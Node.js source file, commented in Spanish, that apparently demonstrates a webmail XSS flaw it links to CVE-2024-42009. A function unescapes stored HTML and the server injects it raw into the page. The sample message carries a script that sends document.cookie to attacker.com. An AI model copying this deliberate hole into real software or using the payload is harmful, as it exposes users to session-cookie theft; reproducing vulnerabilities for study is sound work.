const http = require('http');
const url = require('url');

// Simula un "visor de correo" muy simplificado
// Vulnerabilidad tipo CVE-2024-42009: des-sanitización del cuerpo del mensaje
// Se asume que el cuerpo del correo viene "sanitizado" de la base de datos,
// pero luego se vuelve a tratar de forma insegura antes de enviarlo al cliente.

// Función que simula la obtención de un mensaje desde una base de datos
function getMessageFromDb(id) {
  // En un caso real, esto vendría de una BD; aquí lo simulamos con un objeto
  const messages = {
    '1': {
      subject: 'Hola',
      // El atacante envía un correo con HTML/JS malicioso
      // que fue "sanitizado" previamente (por ejemplo, escapado)
      body_sanitized: '&lt;div&gt;Hola usuario&lt;/div&gt;&lt;script&gt;fetch("https://attacker.com/steal?cookie="+document.cookie)&lt;/script&gt;'
    }
  };
  return messages[id] || null;
}

// Función vulnerable que "des-sanitiza" el cuerpo del mensaje
// intentando restaurar el HTML original para mostrarlo "bonito" en el cliente
function message_body_vulnerable(message) {
  // Des-escape manualmente entidades HTML (des-sanitización insegura)
  let body = message.body_sanitized
    .replace(/&lt;/g, '<')
    .replace(/&gt;/g, '>')
    .replace(/&quot;/g, '"')
    .replace(/&#39;/g, "'")
    .replace(/&amp;/g, '&');

  // Se devuelve el HTML directamente, sin ninguna validación ni filtrado
  return body;
}

const server = http.createServer((req, res) => {
  const parsedUrl = url.parse(req.url, true);

  if (parsedUrl.pathname === '/show') {
    const id = parsedUrl.query.id || '1';
    const message = getMessageFromDb(id);

    if (!message) {
      res.writeHead(404, { 'Content-Type': 'text/plain' });
      return res.end('Mensaje no encontrado');
    }

    // Uso de la función vulnerable que des-sanitiza el cuerpo
    const bodyHtml = message_body_vulnerable(message);

    // El cuerpo se inyecta directamente en la página sin escape adicional
    res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
    res.end(`
      <!DOCTYPE html>
      <html>
        <head>
          <meta charset="utf-8" />
          <title>${message.subject}</title>
        </head>
        <body>
          <h1>${message.subject}</h1>
          <div id="message-body">
            ${bodyHtml}
          </div>
        </body>
      </html>
    `);
  } else {
    res.writeHead(200, { 'Content-Type': 'text/plain' });
    res.end('OK');
  }
});

server.listen(3000, () => {
  console.log('Servidor vulnerable escuchando en http://localhost:3000');
});
